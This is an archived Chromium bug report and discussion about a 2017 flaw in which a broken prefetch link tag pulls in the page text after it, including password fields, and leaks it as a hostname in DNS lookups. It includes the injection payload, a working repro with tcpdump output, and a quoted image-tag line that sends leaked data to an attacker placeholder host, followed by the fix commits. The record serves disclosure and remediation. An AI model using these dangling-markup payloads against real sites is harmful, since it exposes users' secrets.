# Broken prefetch links can exfiltrate adjacent page text

| Field | Value |
|-------|-------|
| **Issue ID** | [40086872](https://issues.chromium.org/issues/40086872) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P4 |
| **Component** | Blink>HTML>Link, Blink>HTML>Parser, Internals>Network>DNS, Privacy |
| **Reporter** | ce...@argeniss.com |
| **Assignee** | mk...@chromium.org |
| **Created** | 2017-02-23 |
| **Bounty** | $500.00 |

## Description

Modified bug report based on the attachment provided by the reporter:

Should a web page suffer from an XSS or HTML injection vulnerability an attack might inject a broken pre-fetch link, as follows:
 <link rel=”prefetch” href=”http://

The payload above leaves Google Chrome to decide how the rest of the link should be treated. Currently (tested on version 53.0.2 64bit) Google uses adjacent page contents to complete the anchor (href). This can be seen in First.png.
<See First.png>

The broken pre-fetch link triggers a DNS lookup using the page contents as a domain name.

Given that DNS is often deployed unencrypted, with no authentication and can be easily eavesdropped on; this means any DNS queries that result from injection of broken pre-fetch links can be used to expose sensitive page contents such as an input field containing a password.

======================

Originally posted by the reporter:
Hi, find attached vulnerability report.
Thanks.


## Attachments

- [First.png](attachments/First.png) (image/png, 49.5 KB)
- [Google Chrome prefetch.docx](attachments/Google Chrome prefetch.docx) (application/octet-stream, 695.2 KB)

## Timeline

### ke...@chromium.org (2017-02-23)

Can you please put the vulnerability report details in the bug itself so that I can view them? Thank you.

### ce...@argeniss.com (2017-02-24)

Don't you have access to the attached document? 

### el...@chromium.org (2017-03-02)

Basically, this is saying that if a page has incorrect markup (or allows content injection) the content following a link rel=prefetch tag could get sent as an unencrypted prefetch request. It's not clear that this is any different than injecting e.g. 

    <img src="https://attacker.site/?leakeddata=


Title	Broken prefetch link DNS exfiltration
Severity	CVSS Score 5.2 (AV:A/AC:L/Au:N/C:C/I:N/A:N/E:H/RL:W/RC:UC)
Discovered by	Keith Makan
Advisory Date	02/22/2017

Affected Product
Google Chrome https://www.google.com/chrome/browser/desktop/index.html 
version 53.0.2 64bit 
Impact
An unauthenticated attacker exploiting a HTML injection attack can inject a broken pre-fetch/preload link that triggers exposure of page contents during an encrypted SSL/TLS stream. 
Background
Google Chrome is one of the world’s most popular browsers. Chrome is developed and maintained by Google and is developed to protect its users from privacy breaches and SSL/TLS failures. 
Technical Details
IOActive found that Google Chrome suffers from a flaw in which attackers can potentially by pass Content Security Policy as well as SSL/TLS confidentiality in order to leak page contents.
Pre-fetch links are used to resolve URLs and Domain Names that may reference resources that a web page may need in future. Link prefetching was designed to minimize the overhead of domain name look ups and TCP connections during interaction with a web page. When a browser encounters a sub-resource pre-fetch link (as below):

<link rel=”prefetch” href=http://re.source/>

The browser initiates a DNS lookup and TCP connection to http://re.source. Should a web page suffer from an XSS or HTML injection vulnerability an attack might inject a broken pre-fetch link, as follows:

 <link rel=”prefetch” href=”http://
The payload above leaves Google chrome to decide how the rest of the link should be treated. Currently (tested on version 53.0.2 64bit ) Google uses adjacent page contents to complete the anchor (href), this can be seen in the screenshot below:

 
Figure  Broken Pre-fetch link injection
The pre-fetch link in the screenshot above triggers a DNS lookup using the page contents as a domain name, as can be seen in the following screenshots.

 

 

Given that DNS is often deployed unencrypted, with no authentication and can be easily eavesdropped on; this means any DNS queries that result from injection of broken pre-fetch links can be used to expose sensitive page contents such as an input field containing a password (as in the example above). 
Mitigation
⦁	Advice for Web Developers: 
⦁	Sanitize input from active HTML metadata using functions like htmlentities.
⦁	Advice for the Chrome team / other browser folks: 
⦁	Chrome should inspect/filter pre-fetch links and not trigger lookups that don’t contain possible page contents or input barring html elements.
⦁	Add directives to CSP implementation to restrict sub-resource link behavior
Timeline
⦁	Discovered 02/10/2017
⦁	Disclosed 02/22/2017  


### va...@chromium.org (2017-03-02)

[Description Changed]

### va...@chromium.org (2017-03-02)

This requires an attacker that is capable of performing an XS or HTML injection.
If the attacker can already do that, we've already lost our security guarantee so it doesn't seem like this opens an additional threat vector.

palmer@, estark@, mbarbella@: thoughts?

### pa...@chromium.org (2017-03-02)

Although the attack has the precondition of an XSS, Chrome's behavior does (or, would; see below) exacerbate the problem — giving an attacker control of an origin + broadcasting some data unencrypted is strictly worse than just giving an attacker control of an origin alone.

I don't know if the problem is in our HTML parser, or specific to prefetch, but either way, Chrome/Blink should fail closed on weird/broken HTML.

That said, I cannot reproduce the problem with this PoC:

===
<link rel="prefetch" src="http://    blorg.noodle

hello
===

and this tcpdump command line:

  tcpdump -a -v -s 65535 -i em1 udp port 53

(I do see other DNS requests, so I know it's working.)

+cbentzel: Who's a good prefetch person?

+mek and jbroman, who have done some work on core/html/LinkRelAttribute.cpp.

[Monorail components: Blink>HTML>Link Internals>Network>DNS]

### el...@chromium.org (2017-03-03)

Re #6 reproduction: The syntax for LINK uses HREF rather than SRC. I would also not be surprised if the parser requires that a terminating quote be found somewhere later in the markup.

### jb...@chromium.org (2017-03-05)

My work on LinkRelAttribute.cpp is pretty tangential.

This seems to me like it's either a parsing issue (but IIUC the HTML spec specifies how we're supposed to recover from "weird" HTML from a parsing perspective, for compatibility -- core/html/parser/OWNERS know details), or possibly we should decline to prefetch "suspicious" prefetch URLs.

### cb...@chromium.org (2017-03-06)

+possible prefetch folks

### cs...@chromium.org (2017-03-06)

+mkwst who has been working on dangling markup attacks.

[Monorail components: Blink>HTML>Parser]

### va...@chromium.org (2017-03-06)

[Empty comment from Monorail migration]

### pa...@chromium.org (2017-03-06)

Good news, everyone. Working repro case:

===
<h1>Hello</h1>

<link rel="prefetch" href="http://    blorg.noodle
additional stuff
"
hello

<p>stuff</p>
===

tcpdump shows:

===
14:28:22.895231 IP (tos 0x0, ttl 64, id 53223, offset 0, flags [DF], proto UDP (17), length 105)
    [redacted].63628 > [redacted]: 59922+ AAAA? %20%20%20%20blorg.noodleadditional%20stuff.[redacted].
===

I'd argue that the upper layers shouldn't try to prefetch malformed stuff, *and* that the DNS client stuff not try to resolve things that can't even be hostnames, like "%20...".

Calling this severity Medium, but it might be Low, due to requiring the attacker to both be in a position to modify HTML content (by whatever means — MITM, XSS, other) *and* having to be in a position to monitor DNS traffic. That's arguable; more importantly, we should fix it (ideally in an update to 58).

### cs...@chromium.org (2017-03-07)

I don't see any difference between this example and https://crbug.com/chromium/680970. How is prefetch specifically different from any other href/src attribute?

### mk...@chromium.org (2017-03-07)

I agree; if the numbers look reasonable for the experiment in https://crbug.com/chromium/680970 (basically treating URLs that contain newlines and raw `<` as an error, rather than transparently fixing them up), then shipping that behavior should also fix this issue.

That said, I agree with Chris that we shouldn't be sending DNS resolution requests for obviously malformed hostnames. It surprises me a little that percent-encoded whitespace made it into the lookup request. cbentzel@, is there someone on the //net team we should talk to about that?

### jk...@chromium.org (2017-03-07)

+Julia for DNS resolution

### cb...@chromium.org (2017-03-07)

+mgersh as well

### ju...@chromium.org (2017-03-07)

My impression is that % is never allowed in DNS names. I could add a validation step to reject hostnames containing it.

Or, mkwst could add % to the ongoing URL validation work in https://crbug.com/chromium/680970.

### cs...@chromium.org (2017-03-07)

Note that https://crbug.com/chromium/652808 is also in progress by +brettw which would stop some of  these at URL canonicalization layer.

### pa...@chromium.org (2017-03-07)

Re #17 and https://crbug.com/chromium/680970: The mitigation for runaway HTML is likely to be less solid than what we can do in DNS (see e.g. https://en.wikipedia.org/wiki/Hostname#Restrictions_on_valid_hostnames). The DNS validation rules are much simpler and clear, and thus it's easier to write a strict validator for.

### mk...@chromium.org (2017-03-08)

I agree with #19. We should do both. :)

### el...@chromium.org (2017-03-09)

I don't think this makes sense to track as a security vulnerability. If an attacker can inject content on your domain, *that* is the security vulnerability; the mechanism described here is but one of numerous ways he could leak adjacent markup.

If there are no objections, we can remove the view restrictions entirely.

### pa...@chromium.org (2017-03-09)

As I said in #6, I think this is *also* a vulnerability in Chrome: It's Chrome's fault that XSS can also result in spraying private data over the network in the clear. I think we should continue to treat it as a regular security vulnerability bug , including getting it assigned to an owner ASAP, and keeping it secret until it's fixed.

### pa...@chromium.org (2017-03-09)

Also, you might want to break it up into 2 security bugs, to track the HTML parsing and the DNS validation fixes separately.

### pa...@chromium.org (2017-03-10)

[Empty comment from Monorail migration]

### ko...@chromium.org (2017-03-13)

[Empty comment from Monorail migration]

[Monorail components: Privacy]

### ko...@chromium.org (2017-03-13)

[Empty comment from Monorail migration]

### pa...@chromium.org (2017-03-22)

OK, I am working on a fix at the DNS layer (https://codereview.chromium.org/2739203003), but it's going to require UMA measurement and then an Intent To Deprecate And Remove, so it'll be a while.

I really think that someone who is familiar with Blink parsing and rel=prefetch should fix it at that layer too, and sooner.

Basically, if the href/src (of any element, really; not just link) doesn't parse as a real GURL, fail immediately rather than trying to fetch garbage.

If you don't, I will try to... and nobody wants that. :)

### cs...@chromium.org (2017-03-23)

I'm sorry if I'm misunderstanding, but isn't what you're proposing in #27 essentially the proposal in https://crbug.com/chromium/680970? i.e. to make src/href parsing stricter.

If we need to be even stricter (as juliatuttle@ mentions) let's change that experiment which already has an I2I and metrics collection set up. It is a public bug though so we may need another security bug referencing it if you would prefer these issues to be separated.

### bu...@chromium.org (2017-03-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/6170ab968eae5c5f683cdb88fa09e96b95f2b588

commit 6170ab968eae5c5f683cdb88fa09e96b95f2b588
Author: palmer <palmer@chromium.org>
Date: Thu Mar 23 20:57:54 2017

Measure how often DNS hostnames aren't in preferred name form.

As https://tools.ietf.org/html/rfc7719#section-2 explains, "host name" has a storied
history with many interpretations. Measure how often the hostnames passed to the
resolver aren't in the preferred name form [A-Za-z0-9-]+ (with support for _ as well),
to see where the DNS resolver code can deprecate and remove support for names
not in that form.

BUG=695474

Review-Url: https://codereview.chromium.org/2739203003
Cr-Commit-Position: refs/heads/master@{#459212}

[modify] https://crrev.com/6170ab968eae5c5f683cdb88fa09e96b95f2b588/net/dns/dns_util.cc
[modify] https://crrev.com/6170ab968eae5c5f683cdb88fa09e96b95f2b588/net/dns/dns_util.h
[modify] https://crrev.com/6170ab968eae5c5f683cdb88fa09e96b95f2b588/net/dns/dns_util_unittest.cc
[modify] https://crrev.com/6170ab968eae5c5f683cdb88fa09e96b95f2b588/tools/metrics/histograms/histograms.xml


### pa...@chromium.org (2017-03-24)

#28: No, you're right. Added that bug and https://crbug.com/chromium/680969 as blockers of this one.

### ce...@argeniss.com (2017-05-17)

Hi everyone, can you tell me if this is fixed or if not then when it will be? We are publicly disclosing this soon as enough time has passed.

### pa...@chromium.org (2017-05-17)

#31: It's not fixed yet; I described the problem in #21: We really need a Blink engineer to fix this in Blink. See also #30. I'll try to get some movement.

### ju...@chromium.org (2017-05-17)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-06-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/64af80e692404a380476b4b7edb27392eae75014

commit 64af80e692404a380476b4b7edb27392eae75014
Author: palmer <palmer@chromium.org>
Date: Thu Jun 01 01:10:19 2017

Track how often we would attempt to resolve non-'compliant' domain names.

We have 2 hostname goodness predicates: checking that
`net::IsValidHostLabelCharacter` returns true for all characters in all labels,
and `net::IsCanonicalizedHostCompliant`. The latter is more strict than the
former, in that it imposes an additional constraint on the final label: it can
only begin with an alphanumeric character.

Add a counter to see how often hostnames would pass the former check but fail
the latter, stricter check. This will help us decide which predicate to finalize
on.

BUG=695474

Review-Url: https://codereview.chromium.org/2906723002
Cr-Commit-Position: refs/heads/master@{#476122}

[modify] https://crrev.com/64af80e692404a380476b4b7edb27392eae75014/net/dns/dns_util.cc
[modify] https://crrev.com/64af80e692404a380476b4b7edb27392eae75014/tools/metrics/histograms/histograms.xml


### bu...@chromium.org (2017-06-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/6d7956de098e0a62f233ab334ac5271aba6864ef

commit 6d7956de098e0a62f233ab334ac5271aba6864ef
Author: palmer <palmer@chromium.org>
Date: Mon Jun 12 21:05:30 2017

Track how often we successfully resolve non-'compliant' domain names.

Add a counter to see how often we successfully resolve hostnames, tracking
whether or not |net::IsValidHostLabelCharacter| returns true for all characters
in all labels in the name.

BUG=695474

Review-Url: https://codereview.chromium.org/2921553002
Cr-Commit-Position: refs/heads/master@{#478761}

[modify] https://crrev.com/6d7956de098e0a62f233ab334ac5271aba6864ef/net/dns/dns_util.cc
[modify] https://crrev.com/6d7956de098e0a62f233ab334ac5271aba6864ef/net/dns/dns_util.h
[modify] https://crrev.com/6d7956de098e0a62f233ab334ac5271aba6864ef/net/dns/host_resolver_proc.cc
[modify] https://crrev.com/6d7956de098e0a62f233ab334ac5271aba6864ef/tools/metrics/histograms/histograms.xml


### bu...@chromium.org (2017-07-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/9cbf4215c46641a23feedc6e33914a3e462508d4

commit 9cbf4215c46641a23feedc6e33914a3e462508d4
Author: Chris Palmer <palmer@chromium.org>
Date: Wed Jul 19 01:54:55 2017

Enforce the hostname validity check.

Also update test expectations to match the new preferred name syntax policy
enforcement, and add new tests to ensure that the policy is enforced at various 
layers of abstraction/in various net components.

We've been using |DNSDomainFromDotWithValidityCheck|, which returns whether or
not the given name matches the "preferred name syntax"
(https://tools.ietf.org/html/rfc7719#section-2), but using the result only in an
advisory capacity to measure the histogram
Net.SuccessfulResolutionWithValidDNSName. This change still measures the
histogram when the name is not in preferred name syntax, but also returns
|ERR_NAME_NOT_RESOLVED|, effectively enforcing the sanity check.

BUG=496468,695474

Change-Id: Iababe35f0bef37ba07eed8a6edcea43bdec10335
Reviewed-on: https://chromium-review.googlesource.com/569298
Reviewed-by: Mark Pearson <mpearson@chromium.org>
Reviewed-by: Matt Menke <mmenke@chromium.org>
Commit-Queue: Chris Palmer <palmer@chromium.org>
Cr-Commit-Position: refs/heads/master@{#487716}
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/net/base/host_port_pair.cc
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/net/dns/dns_hosts_unittest.cc
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/net/dns/dns_transaction_unittest.cc
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/net/dns/dns_util.cc
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/net/dns/dns_util.h
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/net/dns/dns_util_unittest.cc
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/net/dns/host_resolver_impl.cc
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/net/dns/host_resolver_impl_unittest.cc
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/net/dns/host_resolver_proc.cc
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/net/http/transport_security_state_unittest.cc
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/net/spdy/chromium/spdy_session_pool_unittest.cc
[modify] https://crrev.com/9cbf4215c46641a23feedc6e33914a3e462508d4/tools/metrics/histograms/histograms.xml


### pa...@chromium.org (2017-08-09)

I've done my part on this; mkwst has a CL in progress for the rest.

### bu...@chromium.org (2017-08-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/682b16cc3fd2316946670f25f38a9abba6827fe4

commit 682b16cc3fd2316946670f25f38a9abba6827fe4
Author: Mike West <mkwst@chromium.org>
Date: Fri Aug 11 14:27:38 2017

Apply dangling markup restrictions to `<link>`.

`preconnect`, `dns-prefetch`, and `prefetch` were all inadvertantly
bypassing the danging markup mitigations we landed for "actual" resource
requests. This patch resolves that oversight.

Bug: 680970, 695474, 749852
Change-Id: Ic2a262d062a92830b1869b3fb3183280156f3c0a
Reviewed-on: https://chromium-review.googlesource.com/571785
Commit-Queue: Mike West <mkwst@chromium.org>
Reviewed-by: Yoav Weiss <yoav@yoav.ws>
Cr-Commit-Position: refs/heads/master@{#493728}
[modify] https://crrev.com/682b16cc3fd2316946670f25f38a9abba6827fe4/chrome/test/data/webui/i18n_process_test.html
[add] https://crrev.com/682b16cc3fd2316946670f25f38a9abba6827fe4/third_party/WebKit/LayoutTests/http/tests/security/dangling-markup/link-prefetch-expected.txt
[add] https://crrev.com/682b16cc3fd2316946670f25f38a9abba6827fe4/third_party/WebKit/LayoutTests/http/tests/security/dangling-markup/link-prefetch.html
[modify] https://crrev.com/682b16cc3fd2316946670f25f38a9abba6827fe4/third_party/WebKit/Source/core/html/HTMLLinkElement.cpp
[modify] https://crrev.com/682b16cc3fd2316946670f25f38a9abba6827fe4/third_party/WebKit/Source/core/loader/LinkLoader.cpp


### pa...@chromium.org (2017-08-11)

I think that does it. Thanks mkwst!

### bu...@chromium.org (2017-08-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/9aa51a5d91811c1009a9a1655ed8c935504e2f76

commit 9aa51a5d91811c1009a9a1655ed8c935504e2f76
Author: Mike West <mkwst@chromium.org>
Date: Fri Aug 18 07:23:34 2017

Apply dangling markup restrictions to `<link>`.

`preconnect`, `dns-prefetch`, and `prefetch` were all inadvertantly
bypassing the danging markup mitigations we landed for "actual" resource
requests. This patch resolves that oversight.

TBR=mkwst@chromium.org

(cherry picked from commit 682b16cc3fd2316946670f25f38a9abba6827fe4)

Bug: 680970, 695474, 749852
Change-Id: Ic2a262d062a92830b1869b3fb3183280156f3c0a
Reviewed-on: https://chromium-review.googlesource.com/571785
Commit-Queue: Mike West <mkwst@chromium.org>
Reviewed-by: Yoav Weiss <yoav@yoav.ws>
Cr-Original-Commit-Position: refs/heads/master@{#493728}
Reviewed-on: https://chromium-review.googlesource.com/620587
Reviewed-by: Mike West <mkwst@chromium.org>
Cr-Commit-Position: refs/branch-heads/3163@{#671}
Cr-Branched-From: ff259bab28b35d242e10186cd63af7ed404fae0d-refs/heads/master@{#488528}
[modify] https://crrev.com/9aa51a5d91811c1009a9a1655ed8c935504e2f76/chrome/test/data/webui/i18n_process_test.html
[add] https://crrev.com/9aa51a5d91811c1009a9a1655ed8c935504e2f76/third_party/WebKit/LayoutTests/http/tests/security/dangling-markup/link-prefetch-expected.txt
[add] https://crrev.com/9aa51a5d91811c1009a9a1655ed8c935504e2f76/third_party/WebKit/LayoutTests/http/tests/security/dangling-markup/link-prefetch.html
[modify] https://crrev.com/9aa51a5d91811c1009a9a1655ed8c935504e2f76/third_party/WebKit/Source/core/html/HTMLLinkElement.cpp
[modify] https://crrev.com/9aa51a5d91811c1009a9a1655ed8c935504e2f76/third_party/WebKit/Source/core/loader/LinkLoader.cpp


### na...@google.com (2019-01-23)

[Empty comment from Monorail migration]

### na...@google.com (2019-01-23)

[Empty comment from Monorail migration]

### na...@google.com (2019-01-24)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-01-24)

Congrats! The Panel has decided to reward $500 for this report. 

Since you are a new reporter how would you like to be credited in release notes? 

### na...@google.com (2019-01-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-24)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rd...@google.com (2019-01-24)

[Empty comment from Monorail migration]

### ce...@argeniss.com (2019-01-24)

Hi, the finder of the issue is Keith Makan, this is his email keith.makan@ioactive.com so you can contact him about how to get the prize or let me know what he should do in order to get the prize.
Thanks.

### aw...@google.com (2019-08-08)

[Empty comment from Monorail migration]

### co...@kjsman.me (2019-08-14)

[Comment Deleted]

### co...@kjsman.me (2019-08-14)

https://crbug.com/chromium/695474#c50: I'm sorry, I added the comment to the wrong place.

### is...@google.com (2019-08-14)

This issue was migrated from crbug.com/chromium/695474?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>HTML>Link, Blink>HTML>Parser, Internals>Network>DNS, Privacy]
[Monorail blocked-on: crbug.com/chromium/680969, crbug.com/chromium/680970]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086872)*
